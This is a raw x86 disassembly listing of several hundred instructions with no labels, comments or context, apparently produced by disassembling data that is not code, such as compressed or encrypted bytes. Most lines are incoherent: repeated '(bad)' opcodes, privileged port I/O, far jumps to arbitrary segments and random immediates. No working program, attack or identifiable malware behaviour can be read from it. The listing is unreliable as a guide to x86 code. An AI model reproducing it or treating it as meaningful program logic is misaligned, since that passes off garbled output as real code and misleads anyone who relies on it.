  41804d:	mov    dl,0x62
  41804f:	jecxz  0x4180af
  418051:	(bad)  
  418052:	dec    esp
  418053:	and    ebp,DWORD PTR [ecx]
  418055:	in     eax,dx
  418056:	popa   
  418057:	push   cs
  418058:	inc    esi
  418059:	sub    al,0x76
  41805b:	push   esp
  41805c:	or     bh,BYTE PTR [ebp-0x6f68a815]
  418062:	test   al,ch
  418064:	shr    BYTE PTR [edx+0x234bae10],1
  41806a:	push   esi
  41806b:	dec    esi
  41806c:	push   esi
  41806d:	cld    
  41806e:	xchg   ebp,eax
  41806f:	jns    0x4180c7
  418071:	into   
  418072:	pop    es
  418073:	jl     0x418096
  418075:	addr16 jb 0x4180a7
  418078:	inc    edi
  418079:	or     edi,edi
  41807b:	mov    dh,0x2b
  41807d:	lods   al,BYTE PTR ds:[esi]
  41807e:	popw   es
  418080:	gs mov eax,0x4512bbd5
  418086:	adc    DWORD PTR [edi+0xc18c829],0xffffffdd
  41808d:	mov    bl,0x1f
  41808f:	call   0x8c0b:0x6b290c27
  418096:	mov    ecx,0x31d46d51
  41809b:	cli    
  41809c:	mov    cl,0x3f
  41809e:	xchg   ebx,eax
  41809f:	idiv   DWORD PTR [ecx-0x666e6152]
  4180a5:	adc    edi,edx
  4180a7:	fsub   QWORD PTR [edx]
  4180a9:	inc    esi
  4180aa:	loop   0x41809d
  4180ac:	cmp    al,0xfe
  4180ae:	mov    ds,WORD PTR [ebx-0x2b710693]
  4180b4:	pop    ecx
  4180b5:	mov    edi,0x1e89c0c8
  4180ba:	imul   eax,DWORD PTR [edx+eiz*2+0xc],0x34
  4180bf:	sti    
  4180c0:	push   eax
  4180c1:	imul   edi,DWORD PTR [eax+0x3d],0x73b240a
  4180c8:	sub    BYTE PTR [esi-0x76],0x59
  4180cc:	jb     0x4180fb
  4180ce:	mov    ds:0xa4d90ffe,al
  4180d3:	les    eax,FWORD PTR [edx-0xfb21ff1]
  4180d9:	jl     0x41809b
  4180db:	sub    al,0xfc
  4180dd:	sub    BYTE PTR [esi+edx*8+0x41],ch
  4180e1:	xor    eax,0xc381dbc4
  4180e6:	dec    edi
  4180e7:	inc    edx
  4180e8:	clc    
  4180e9:	test   BYTE PTR [edi],ah
  4180eb:	loope  0x418103
  4180ed:	mov    cl,0x35
  4180ef:	or     edx,DWORD PTR [eax]
  4180f1:	push   ds
  4180f2:	sub    al,0xad
  4180f4:	lock pop eax
  4180f6:	pop    esp
  4180f7:	and    ecx,esp
  4180f9:	popf   
  4180fa:	ins    BYTE PTR es:[edi],dx
  4180fb:	xchg   esi,eax
  4180fc:	ins    BYTE PTR es:[edi],dx
  4180fd:	cmp    al,0xf6
  4180ff:	ds dec ebp
  418101:	call   0xc3faa5e9
  418106:	neg    BYTE PTR [eax+ecx*2-0x7375cb52]
  41810d:	or     ebp,DWORD PTR [esi-0x6847ea41]
  418113:	adc    al,0x9e
  418115:	push   esp
  418116:	in     eax,dx
  418117:	in     eax,dx
  418118:	test   DWORD PTR [ebx+0x65],0xfca9ddf2
  41811f:	lods   eax,DWORD PTR ds:[esi]
  418120:	imul   ebp,DWORD PTR [eax],0xffffff8c
  418123:	mov    ebx,0xd014a7d3
  418128:	inc    esp
  418129:	xchg   esi,eax
  41812a:	bound  ebx,QWORD PTR ds:0x90e34cae
  418130:	cld    
  418131:	jg     0x418188
  418133:	das    
  418134:	aad    0xac
  418136:	add    bl,BYTE PTR [esi]
  418138:	enter  0xa115,0x38
  41813c:	pushf  
  41813d:	cmp    BYTE PTR [esi-0x79],0x44
  418141:	cmp    al,0xbc
  418143:	push   esp
  418144:	xchg   esi,eax
  418145:	leave  
  418146:	fnclex 
  418148:	aaa    
  418149:	pop    eax
  41814a:	adc    al,0x11
  41814c:	nop
  41814d:	cmp    BYTE PTR [ebx-0x4],bl
  418150:	add    esi,DWORD PTR [eax]
  418152:	mov    dl,0x71
  418154:	popf   
  418155:	in     al,dx
  418156:	retf   0xe906
  418159:	adc    bl,ah
  41815b:	add    ebp,ebx
  41815d:	xchg   esp,eax
  41815e:	mov    eax,0x379baea8
  418163:	xor    eax,0xb9754e68
  418168:	mov    WORD PTR [ebx+eax*1+0x5d],ss
  41816c:	cwde   
  41816d:	cmp    dh,BYTE PTR [ecx*2-0x1c11c679]
  418174:	imul   esp,esp,0xffffffca
  418177:	xchg   ebx,eax
  418178:	dec    ebp
  418179:	xor    DWORD PTR [ebp-0x74d965],0x53b57075
  418183:	and    cl,dh
  418185:	dec    ecx
  418186:	(bad)  
  418187:	xlat   BYTE PTR ds:[ebx]
  418188:	add    dl,BYTE PTR [edi-0x6add1a60]
  41818e:	jb     0x41819e
  418190:	dec    ebx
  418191:	jmp    0x4181c7
  418193:	add    DWORD PTR [ecx-0x43a5ef38],ecx
  418199:	adc    eax,0x2c9f2334
  41819e:	ficom  DWORD PTR [ecx-0xd855de5]
  4181a4:	sar    BYTE PTR [ebx+0x4d615ed3],cl
  4181aa:	xchg   edi,eax
  4181ab:	cmp    eax,0x37561e61
  4181b0:	jp     0x4181e7
  4181b2:	(bad)  
  4181b3:	int3   
  4181b4:	xchg   esp,eax
  4181b5:	pop    ebp
  4181b6:	sahf   
  4181b7:	repz pop ecx
  4181b9:	mov    dl,0x4e
  4181bb:	and    bh,bh
  4181bd:	cwde   
  4181be:	outs   dx,BYTE PTR ds:[esi]
  4181bf:	or     BYTE PTR [edi+0x1b],dh
  4181c2:	push   ebp
  4181c3:	mov    ah,0x2b
  4181c5:	mov    eax,DWORD PTR [esi]
  4181c7:	mov    cl,0xf8
  4181c9:	cs retf 0x397f
  4181cd:	aas    
  4181ce:	sub    eax,0x6b02dfdb
  4181d3:	adc    eax,0xecc57221
  4181d8:	sbb    ecx,ecx
  4181da:	std    
  4181db:	dec    ebp
  4181dc:	mov    ecx,0xb57f4fb1
  4181e1:	sub    eax,0x2a832432
  4181e6:	pop    es
  4181e7:	dec    eax
  4181e8:	(bad)  
  4181e9:	daa    
  4181ea:	out    dx,eax
  4181eb:	sbb    al,0x3b
  4181ed:	and    eax,0x360c28c5
  4181f2:	push   edx
  4181f3:	cmp    eax,0x9c1d4f16
  4181f8:	xor    eax,0x887283b4
  4181fd:	aam    0x58
  4181ff:	shl    DWORD PTR [ebx],0x39
  418202:	repnz xchg edi,eax
  418204:	dec    ebp
  418205:	std    
  418206:	sbb    al,0x31
  418208:	lea    esp,[ebx+0x695c6838]
  41820e:	push   eax
  41820f:	jp     0x4181f4
  418211:	xchg   edx,eax
  418212:	scas   al,BYTE PTR es:[edi]
  418213:	fnstenv [edx+0x2a47cbb5]
  418219:	add    ch,BYTE PTR [ecx+ecx*2+0x32]
  41821d:	sbb    BYTE PTR ds:0xe87d720c,al
  418223:	sub    al,0x6f
  418225:	sti    
  418226:	sub    ah,bl
  418228:	lea    esp,[edi]
  41822a:	adc    esi,edx
  41822c:	mov    al,0x4a
  41822e:	push   ebx
  41822f:	sub    eax,0x4bfaf07d
  418234:	cmp    al,BYTE PTR [eax-0x25]
  418237:	inc    edi
  418238:	je     0x4182a1
  41823a:	pusha  
  41823b:	mov    esi,0xf1be1d13
  418240:	push   edi
  418241:	retf   
  418242:	xchg   BYTE PTR [edx-0x1a24a87c],cl
  418248:	mov    ds:0x5e7f38b,eax
  41824d:	stos   BYTE PTR es:[edi],al
  41824e:	sub    ch,bh
  418250:	ss (bad) 
  418252:	push   ss
  418253:	sub    eax,0x2888cd40
  418258:	ret    0xe88f
  41825b:	jns    0x418254
  41825d:	in     al,dx
  41825e:	out    dx,eax
  41825f:	mov    ebp,0x658c41e1
  418264:	inc    edi
  418265:	ret    0x2008
  418268:	fsub   QWORD PTR [eax+edx*8]
  41826b:	sub    bh,bl
  41826d:	test   eax,0xc830986f
  418272:	dec    ebp
  418273:	cdq    
  418274:	bound  ebx,QWORD PTR [edx+0x5f]
  418277:	adc    eax,0x22aa4f33
  41827c:	nop
  41827d:	call   0x7cff9cb9
  418282:	pop    ebx
  418283:	mov    ds:0x24530084,al
  418288:	xchg   BYTE PTR [eax+0x51354639],ah
  41828e:	xor    DWORD PTR [ecx-0x5f],ebp
  418291:	ds xor eax,0xe4c55f05
  418297:	push   ecx
  418298:	xchg   ebx,eax
  418299:	pop    ecx
  41829a:	sub    ah,BYTE PTR [ebx+0x71]
  41829d:	cli    
  41829e:	scas   al,BYTE PTR es:[edi]
  41829f:	out    0xf,al
  4182a1:	aas    
  4182a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a3:	cmp    dh,0x9
  4182a6:	mov    DWORD PTR [edi],ebx
  4182a8:	push   ebp
  4182a9:	lods   eax,DWORD PTR ds:[esi]
  4182aa:	xor    al,0x63
  4182ac:	out    dx,eax
  4182ad:	ins    DWORD PTR es:[edi],dx
  4182ae:	repnz scas eax,DWORD PTR es:[edi]
  4182b0:	scas   eax,DWORD PTR es:[edi]
  4182b1:	loope  0x418316
  4182b3:	xchg   edx,eax
  4182b4:	and    eax,0xab8756bd
  4182b9:	xchg   edi,eax
  4182ba:	inc    eax
  4182bb:	enter  0x1782,0xda
  4182bf:	jge    0x418296
  4182c1:	jns    0x4182d9
  4182c3:	or     DWORD PTR [eax],0xffffff90
  4182c6:	setnp  al
  4182c9:	rcl    BYTE PTR [edi+0x3d7169eb],1
  4182cf:	sbb    DWORD PTR [edi],ebx
  4182d1:	fsubr  st,st(7)
  4182d3:	jbe    0x4182e3
  4182d5:	loopne 0x418335
  4182d7:	xchg   DWORD PTR [eax-0x19],ecx
  4182da:	adc    bl,ch
  4182dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182dd:	ror    BYTE PTR fs:[ebp-0x31],1
  4182e1:	shl    DWORD PTR [ebx],cl
  4182e3:	mov    ch,0x3b
  4182e5:	fwait
  4182e6:	or     eax,0x8d073abe
  4182eb:	mov    WORD PTR [edi],cs
  4182ed:	inc    esi
  4182ee:	dec    ebx
  4182ef:	cmp    BYTE PTR [esi-0x5eb0e992],0x44
  4182f6:	frstpm(287 only) 
  4182f8:	leave  
  4182f9:	xor    al,0xa6
  4182fb:	shl    BYTE PTR [ebp+0x513e30f7],0xf9
  418302:	cmp    bl,BYTE PTR ds:0x4d5585be
  418308:	ds inc esp
  41830a:	jp     0x41832d
  41830c:	lock jmp 0x4182b4
  41830f:	sub    DWORD PTR [eax],0x29
  418312:	mov    bl,0x2b
  418314:	shl    ebp,cl
  418316:	xor    al,0xe7
  418318:	(bad)  
  418319:	jbe    0x418326
  41831b:	xchg   edx,eax
  41831c:	test   DWORD PTR [edx+0x68312ffe],edi
  418322:	clc    
  418323:	inc    eax
  418324:	sbb    BYTE PTR [ecx-0x3b6db253],0x3f
  41832b:	jo     0x4182e2
  41832d:	pop    edi
  41832e:	adc    al,0xcf
  418330:	xchg   ebx,eax
  418331:	ins    DWORD PTR es:[edi],dx
  418332:	jmp    0x5509:0x96710fef
  418339:	dec    eax
  41833a:	ja     0x4182f4
  41833c:	scas   al,BYTE PTR es:[edi]
  41833d:	jg     0x418375
  41833f:	mov    dl,0xcd
  418341:	add    al,0x51
  418343:	ds jmp 0xd967:0xfe3b784b
  41834b:	push   eax
  41834c:	adc    BYTE PTR [esi],ah
  41834e:	dec    esi
  41834f:	outs   dx,DWORD PTR ds:[esi]
  418350:	mov    bh,0x18
  418352:	sub    dl,dl
  418354:	repnz dec ebp
  418356:	mov    ch,0xa5
  418358:	test   BYTE PTR [edx+ebp*8],dl
  41835b:	xchg   ecx,eax
  41835c:	adc    cl,BYTE PTR [edi+0x5d5c611a]
  418362:	jo     0x4183b0
  418364:	xor    DWORD PTR [ebp+0x45],eax
  418367:	xchg   ebp,eax
  418368:	mov    ebp,0x9125c6f8
  41836d:	push   edi
  41836e:	mov    al,BYTE PTR [edx]
  418370:	push   eax
  418371:	mov    ds:0x694e7ffd,al
  418376:	in     al,dx
  418377:	clc    
  418378:	jbe    0x4183a1
  41837a:	xor    BYTE PTR [edi],0x50
  41837d:	cli    
  41837e:	retf   0xfa66
  418381:	jp     0x4183ef
  418383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418384:	aas    
  418385:	inc    ebp
  418386:	sbb    eax,0xeab742c2
  41838b:	out    dx,al
  41838c:	lahf   
  41838d:	mov    bh,0x9c
  41838f:	es cwde 
  418391:	stc    
  418392:	sti    
  418393:	in     al,dx
  418394:	cli    
  418395:	test   eax,0xbe8a1f52
  41839a:	std    
  41839b:	cmp    eax,0xe7c9e51d
  4183a0:	jbe    0x418398
  4183a2:	rol    BYTE PTR [esi+0x7a],0xa
  4183a6:	pop    ebp
  4183a7:	popf   
  4183a8:	sbb    DWORD PTR [esp+edx*4],esi
  4183ab:	xor    ebx,DWORD PTR [ecx+edx*8-0x73]
  4183af:	lahf   
  4183b0:	test   eax,0xf4c63f4d
  4183b5:	out    dx,eax
  4183b6:	clc    
  4183b7:	mov    eax,gs:0xcfadc499
  4183bd:	loop   0x418359
  4183bf:	xor    al,0x7a
  4183c1:	mov    dh,BYTE PTR [edi-0x73b268eb]
  4183c7:	scas   eax,DWORD PTR es:[edi]
  4183c8:	xor    eax,0xd8ec1d29
  4183cd:	ret    0x32ea
  4183d0:	cmp    bh,BYTE PTR [edx]
  4183d2:	fldl2t 
  4183d4:	fs in  al,dx
  4183d6:	ret    
  4183d7:	daa    
  4183d8:	add    eax,DWORD PTR [eax-0x23]
  4183db:	push   cs
  4183dc:	lahf   
  4183dd:	jle    0x4183ff
  4183df:	push   ebx
  4183e0:	sahf   
  4183e1:	gs sub ebx,ebp
  4183e4:	pop    ss
  4183e5:	(bad)  
  4183e6:	mov    dl,0x30
  4183e8:	sub    edi,DWORD PTR [eax]
  4183ea:	pop    esi
  4183eb:	imul   ebp,DWORD PTR [ecx],0x63ca2898
  4183f1:	mov    ebp,0xaf30676e
  4183f6:	mov    bl,0x55
  4183f8:	jns    0x418464
  4183fa:	pop    edx
  4183fb:	addr16 dec edx
  4183fd:	cmc    
  4183fe:	jmp    0xca8be4d2
  418403:	mov    ebx,?
  418405:	les    edx,FWORD PTR [eax]
  418407:	adc    al,ch
  418409:	mov    esi,0xbf3e4cfe
  41840e:	sub    DWORD PTR [edx+ecx*2+0x458c865b],esp
  418415:	(bad)  
  418417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418418:	mov    eax,0xeb91299a
  41841d:	clc    
  41841e:	cmp    eax,0x7b8893fe
  418423:	test   DWORD PTR [esi-0x78],ebx
  418426:	add    ecx,edi
  418428:	inc    ecx
  418429:	repnz and ch,dl
  41842c:	mov    al,0x3d
  41842e:	adc    BYTE PTR [esi-0x44c0880c],dh
  418434:	sti    
  418435:	cs scas eax,DWORD PTR es:[edi]
  418437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418438:	mov    WORD PTR [edx-0x14],es
  41843b:	and    BYTE PTR [edi-0x71],ah
  41843e:	jb     0x41844e
  418440:	push   esi
  418441:	push   0xffffffab
  418443:	jmp    0x208:0x7b59dcf8
  41844a:	mov    ah,0x3c
  41844c:	lahf   
  41844d:	dec    ebp
  41844e:	adc    eax,0x83c7ee81
  418453:	call   0x5ae4:0x79c0e5ce
  41845a:	pop    esi
  41845b:	jb     0x4184d9
  41845d:	pop    edi
  41845e:	push   esi
  41845f:	pop    eax
  418460:	loopne 0x4184a1
  418462:	xor    al,0x72
  418464:	and    DWORD PTR [esi-0x56ff2e52],edx
  41846a:	cmp    cl,BYTE PTR [eax]
  41846c:	push   eax
  41846d:	fldenv [esi-0x4e]
  418470:	and    al,0x1
  418472:	leave  
  418473:	shl    DWORD PTR [ebx+0x63],0xd4
  418477:	jb     0x418469
  418479:	(bad)  
  41847a:	fmul   QWORD PTR [ecx]
  41847c:	and    esp,DWORD PTR [ebx-0x5f7163b6]
  418482:	pop    ds
  418483:	or     ah,dh
  418485:	jb     0x4184f9
  418487:	scas   al,BYTE PTR es:[edi]
  418488:	and    al,0xd8
  41848a:	sub    ah,BYTE PTR [ebp+0x1c8820e5]
  418490:	repnz mov ebx,0x15ebd329
  418496:	enter  0xe425,0x41
  41849a:	push   edi
  41849b:	cld    
  41849c:	clc    
  41849d:	cmp    eax,0xd296259b
  4184a2:	(bad)  [esi+0x29da6c6a]
  4184a8:	pop    esp
  4184a9:	ficom  WORD PTR [esi-0x299190a1]
  4184af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184b0:	mov    eax,ds:0x67a4f4b6
  4184b5:	jnp    0x4184e9
  4184b7:	sub    edx,DWORD PTR [eax]
  4184b9:	js     0x4184fc
  4184bb:	mov    BYTE PTR [eax+0x4ec2a173],cl
  4184c1:	shr    DWORD PTR [ebx+0x3e33dab9],0xac
  4184c8:	inc    edi
  4184c9:	js     0x4184ef
  4184cb:	js     0x418525
  4184cd:	and    ebp,eax
  4184cf:	mov    ah,bl
  4184d1:	dec    ecx
  4184d2:	mov    cl,0xf3
  4184d4:	xor    ebx,DWORD PTR [esi+0x3b]
  4184d7:	shl    ah,0x80
  4184da:	fadd   QWORD PTR ds:[ebx-0x9]
  4184de:	sar    DWORD PTR [edx-0x71cdde7c],0x67
  4184e5:	mov    ebp,0x1a5d54cc
  4184ea:	aaa    
  4184eb:	addr16 add al,0x41
  4184ee:	cmp    BYTE PTR [edi],bl
  4184f0:	(bad)  
  4184f2:	(bad)  
  4184f3:	pop    edi
  4184f4:	not    DWORD PTR [eax-0x60]
  4184f7:	xchg   ebp,eax
  4184f8:	sti    
  4184f9:	jb     0x418508
  4184fb:	test   BYTE PTR [edx],ah
  4184fd:	adc    al,0xdd
  4184ff:	and    bh,BYTE PTR [ecx+esi*2+0x7e]
  418503:	push   ss
  418504:	ds push edx
  418506:	add    BYTE PTR [eax+eax*1],0x49
  41850a:	scas   al,BYTE PTR es:[edi]
  41850b:	fs in  al,dx
  41850d:	adc    dl,BYTE PTR [ebx]
  41850f:	(bad)  
  418510:	into   
  418511:	adc    DWORD PTR [eax-0x26],eax
  418514:	add    ah,BYTE PTR [eax+0x46]
  418517:	out    dx,al
  418518:	push   edi
  418519:	inc    ebp
  41851a:	pop    es
  41851b:	fnstcw WORD PTR [ebx-0x29]
  41851e:	adc    DWORD PTR [edi-0x4d],eax
  418521:	push   ebp
  418522:	out    0xa0,al
  418524:	into   
  418525:	sbb    eax,0x4d26f0f0
  41852a:	jns    0x41854a
  41852c:	sbb    eax,0x872990b1
  418531:	outs   dx,BYTE PTR ds:[esi]
  418532:	dec    ebp
  418533:	add    al,BYTE PTR [ebx]
  418535:	push   ecx
  418536:	mul    al
  418538:	stos   DWORD PTR es:[edi],eax
  418539:	jb     0x418548
  41853b:	(bad)  
  41853c:	loopne 0x418502
  41853e:	imul   ecx,eax,0xcdf83c
  418544:	jmp    0x80ae:0x12129569
  41854b:	rcr    BYTE PTR [ebp+0x23c694d8],0xac
  418552:	xchg   ebx,eax
  418553:	cwde   
  418554:	test   DWORD PTR [esi],ebx
  418556:	fstp   DWORD PTR [edx-0x33]
  418559:	mov    esi,0x1a9ec7a8
  41855e:	mov    ebp,0xa602b204
  418563:	icebp  
  418564:	out    dx,eax
  418565:	fidivr WORD PTR [edx-0x7767717e]
  41856b:	popa   
  41856c:	fcmovu st,st(3)
  41856e:	dec    esp
  41856f:	dec    ecx
  418570:	pushf  
  418571:	dec    edi
  418572:	pop    ebp
  418573:	aad    0xb
  418575:	dec    ecx
  418576:	pop    ds
  418577:	ror    BYTE PTR [ecx+eiz*1+0xb58989f],cl
  41857e:	inc    ebx
  41857f:	jbe    0x418593
  418581:	hlt    
  418582:	jp     0x418587
  418584:	and    BYTE PTR [edi],ah
  418586:	dec    edi
  418587:	popa   
  418588:	scas   al,BYTE PTR es:[edi]
  418589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41858a:	pop    edx
  41858b:	jecxz  0x418521
  41858d:	clc    
  41858e:	in     eax,dx
  41858f:	mov    al,ds:0xf5de1176
  418594:	fstp   TBYTE PTR [edi]
  418596:	aad    0x27
  418598:	cmp    ebp,edi
  41859a:	push   eax
  41859c:	ret    0x935b
  41859f:	dec    ebx
  4185a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185a1:	jo     0x41854c
  4185a3:	mov    esp,?
  4185a5:	ds int 0x44
  4185a8:	movd   mm3,DWORD PTR [esi+0x5db2deb3]
  4185af:	fidiv  DWORD PTR [edi+edx*8+0x3d5dbcbb]
  4185b6:	call   0x752c3001
  4185bb:	iret   
  4185bc:	pop    ebx
  4185bd:	shl    DWORD PTR [ebx-0x52560f28],1
  4185c3:	push   ecx
  4185c4:	frstor [ebp-0x2c78a279]
  4185ca:	dec    ebx
  4185cb:	sub    DWORD PTR [ecx],ebx
  4185cd:	push   es
  4185ce:	stos   DWORD PTR es:[edi],eax
  4185cf:	jns    0x418554
  4185d1:	pop    ds
  4185d2:	aaa    
  4185d3:	repz jp 0x418632
  4185d6:	mov    WORD PTR [ecx+0x2c371dcb],fs
  4185dc:	mov    bh,bl
  4185de:	and    BYTE PTR ds:0xf6c39429,cl
  4185e4:	fisubr WORD PTR [edx-0x1d]
  4185e7:	xchg   edi,eax
  4185e8:	aad    0x9b
  4185ea:	ja     0x4185eb
  4185ec:	pusha  
  4185ed:	stc    
  4185ee:	sub    al,0xdc
  4185f0:	in     eax,0xdb
  4185f2:	fild   WORD PTR [esi]
  4185f4:	das    
  4185f5:	shr    BYTE PTR [edx+0x7507fba9],1
  4185fb:	and    al,0x1b
  4185fd:	cwde   
  4185fe:	dec    esi
  4185ff:	or     BYTE PTR [ebp-0x43],0xe8
  418603:	jo     0x418652
  418605:	cld    
  418606:	fcomi  st,st(0)
  418608:	sub    al,0x36
  41860a:	pop    esp
  41860b:	dec    ecx
  41860c:	pop    edi
  41860d:	lods   al,BYTE PTR ds:[esi]
  41860e:	(bad)  
  41860f:	mov    esp,0x9a672d08
  418614:	cld    
  418615:	xor    dh,BYTE PTR [ecx]
  418617:	ror    ah,cl
  418619:	sbb    eax,0xdf4ce81
  41861e:	stc    
  41861f:	or     ebx,esp
  418621:	das    
  418622:	mov    ds:0x157e9502,al
  418627:	xchg   ebx,eax
  418628:	jmp    0xabb:0x20c9ca61
  41862f:	xchg   esp,eax
  418630:	(bad)  
  418631:	pop    ds
  418632:	(bad)  
  418633:	fptan  
  418635:	push   0x3b
  418637:	jnp    0x4185cd
  418639:	xchg   edx,eax
  41863a:	jge    0x418676
  41863c:	ss cmp edx,esi
  41863f:	out    0x5d,al
  418641:	or     bh,BYTE PTR [ebx-0x6b]
  418644:	jge    0x4186a1
  418646:	mov    al,ds:0xb850526d
  41864b:	cmp    DWORD PTR [esi-0x3d2cedc],0x32
  418652:	or     al,0x9
  418654:	or     ah,BYTE PTR [ecx-0x3d]
  418657:	sti    
  418658:	jno    0x41867d
  41865a:	dec    esi
  41865b:	push   cs
  41865c:	mov    dh,0xd1
  41865e:	add    eax,0xf5cf982c
  418663:	sub    ch,BYTE PTR cs:[ecx-0x535cb60a]
  41866a:	jmp    0xf5d5:0xedff09d3
  418671:	mov    ebp,0x484c1ef1
  418676:	lods   al,BYTE PTR ds:[esi]
  418677:	and    cl,dl
  418679:	sub    BYTE PTR ds:[eax+edx*2+0xdc1a603],cl
  418681:	fwait
  418682:	jmp    0xb9f7:0xd387593a
  418689:	and    al,0xf3
  41868b:	pop    edi
  41868d:	xchg   edx,eax
  41868e:	jge    0x418682
  418690:	sub    al,0xfc
  418692:	pop    ds
  418693:	push   ebp
  418694:	aas    
  418695:	int    0x2c
  418697:	push   edx
  418698:	cmp    eax,0x10c94c61
  41869d:	pop    es
  41869e:	out    dx,al
  41869f:	daa    
  4186a0:	rcr    al,cl
  4186a2:	sub    dl,BYTE PTR [ebx]
  4186a4:	js     0x418676
  4186a6:	retf   
  4186a7:	pop    ebx
  4186a8:	fcom   DWORD PTR [ebp+0x24]
  4186ab:	inc    ebp
  4186ac:	xor    dh,al
  4186ae:	mov    ds:0xa35bc39c,al
  4186b3:	push   cs
  4186b4:	pushf  
  4186b5:	aam    0x75
  4186b7:	and    eax,0x3a9c70b4
  4186bc:	sub    al,0x24
  4186be:	lds    edx,FWORD PTR [esi]
  4186c0:	sub    DWORD PTR [edi-0x1d],edi
  4186c3:	add    eax,0xcc568c16
  4186c8:	push   esi
  4186c9:	cdq    
  4186ca:	imul   edx,DWORD PTR [esi-0x6d41eced],0xffffffa0
  4186d1:	(bad)  
  4186d2:	xchg   ebx,eax
  4186d3:	loop   0x418739
  4186d5:	dec    ecx
  4186d6:	pusha  
  4186d7:	push   esp
  4186d8:	pop    ebp
  4186d9:	into   
  4186da:	inc    ebx
  4186db:	sbb    BYTE PTR [ebx-0x46],ah
  4186de:	loope  0x418688
  4186e0:	or     esi,DWORD PTR [ebx]
  4186e2:	retf   0xa9fa
  4186e5:	pop    esi
  4186e6:	lock cmp eax,0x9d7b4a2c
  4186ec:	mov    dh,BYTE PTR [eax+0x35]
  4186ef:	or     eax,DWORD PTR [edx+0x14]
  4186f2:	jb     0x4186f6
  4186f4:	mov    WORD PTR [ebx-0x51],fs
  4186f7:	push   esi
  4186f8:	mov    cl,0x4
  4186fa:	adc    eax,0xbbb79cd9
  4186ff:	mov    eax,0xf46690b7
  418704:	cmp    cl,dh
  418706:	fcom   DWORD PTR [eax]
  418708:	push   edx
  418709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41870a:	je     0x418722
  41870c:	dec    edi
  41870d:	dec    esi
  41870e:	xor    DWORD PTR ds:0x56c5464c,0x4b
  418715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418716:	cmp    esp,DWORD PTR [ebp+0x1046942f]
  41871c:	adc    BYTE PTR [eax-0x7dccd039],cl
  418722:	cld    
  418723:	jp     0x4186dd
  418725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418726:	in     eax,dx
  418727:	xor    ecx,DWORD PTR [ebp+0x18f315a6]
  41872d:	jns    0x418727
  41872f:	out    0xa3,al
  418731:	sbb    eax,0x82cd0ca0
  418736:	cmp    ah,bh
  418738:	pop    eax
  418739:	mov    esi,0x36b6f6d
  41873e:	pop    edx
  41873f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418740:	push   0xffffff93
  418742:	fst    DWORD PTR [edx]
  418744:	jg     0x418703
  418746:	xchg   esi,eax
  418747:	stc    
  418748:	call   0x55403f0e
  41874d:	dec    edx
  41874e:	ret    0xc129
  418751:	in     eax,dx
  418752:	popa   
  418753:	push   esp
  418754:	lods   al,BYTE PTR ds:[esi]
  418755:	les    edx,FWORD PTR [edi]
  418757:	fcmovnu st,st(2)
  418759:	js     0x41876a
  41875b:	sub    ebp,DWORD PTR [edi]
  41875d:	addr16 push ebp
  41875f:	popf   
  418760:	test   bl,dh
  418762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418763:	enter  0x2bc2,0x3b
  418767:	mov    edi,0x3150c078
  41876c:	mov    al,0xee
  41876e:	mov    bl,0x41
  418770:	les    ecx,FWORD PTR [edx+0x119c69aa]
  418776:	push   ecx
  418777:	fwait
  418778:	mov    esp,0xf219eadf
  41877d:	nop
  41877e:	xchg   BYTE PTR [bp-0x372a],bh
  418783:	mov    esi,0x96085f53
  418788:	outs   dx,BYTE PTR ds:[esi]
  418789:	cmp    al,0x26
  41878b:	inc    ebp
  41878c:	test   DWORD PTR [ebx],edi
  41878e:	push   cs
  41878f:	pop    ecx
  418790:	dec    ebp
  418791:	retf   
  418792:	pop    ss
  418793:	(bad)
  418796:	dec    edi
  418797:	loopne 0x4187e7
  418799:	sub    edi,DWORD PTR [ebx+0xb]
  41879c:	sub    al,0x6e
  41879e:	mov    ebx,0xe286e69a
  4187a3:	pop    ebx
  4187a4:	sbb    ebp,DWORD PTR [ebx]
  4187a6:	jb     0x418806
  4187a8:	jp     0x418788
  4187aa:	mov    ebp,0x86a1fab9
  4187af:	ins    DWORD PTR es:[edi],dx
  4187b0:	cmc    
  4187b1:	scas   eax,DWORD PTR es:[edi]
  4187b2:	inc    ebp
  4187b3:	xor    eax,0xa157cb3e
  4187b8:	lods   eax,DWORD PTR ds:[esi]
  4187b9:	jg     0x4187ca
  4187bb:	push   edi
  4187bc:	loope  0x41879c
  4187be:	push   ss
  4187bf:	mov    ds:0xdc949347,al
  4187c4:	xor    cl,bh
  4187c6:	ins    BYTE PTR es:[edi],dx
  4187c7:	mov    dh,0x48
  4187c9:	cmc    
  4187ca:	hlt    
  4187cb:	int3   
  4187cc:	into   
  4187cd:	int3   
  4187ce:	dec    ebx
  4187cf:	sbb    eax,0xd636e8a9
  4187d4:	and    al,0x2b
  4187d6:	xchg   esi,eax
  4187d7:	in     al,0xfc
  4187d9:	mov    edi,edx
  4187db:	and    DWORD PTR [esi],ecx
  4187dd:	jno    0x418796
  4187df:	sub    eax,0x4a76afca
  4187e4:	out    0x5f,eax
  4187e6:	or     edx,DWORD PTR fs:[ecx+0x685d0e27]
  4187ed:	xchg   ecx,eax
  4187ee:	stos   BYTE PTR es:[edi],al
  4187ef:	repz dec esp
  4187f1:	jb     0x418834
  4187f3:	cs jo  0x418790
  4187f6:	ret    0xb228
  4187f9:	push   0xfa870f87
  4187fe:	ins    BYTE PTR es:[di],dx
  418800:	scas   eax,DWORD PTR es:[edi]
  418801:	xchg   edi,eax
  418802:	jmp    0x41886d
  418804:	adc    BYTE PTR [ebp+0x3f],ch
  418807:	adc    BYTE PTR [eax-0x3943f0b2],ah
  41880d:	out    0xe1,al
  41880f:	adc    ebx,DWORD PTR [edi*1-0x379ac5e4]
  418816:	ret    0x7e83
  418819:	xchg   ebp,eax
  41881a:	inc    edi
  41881b:	lahf   
  41881c:	push   esp
  41881d:	mov    dh,0x8
  41881f:	aam    0x47
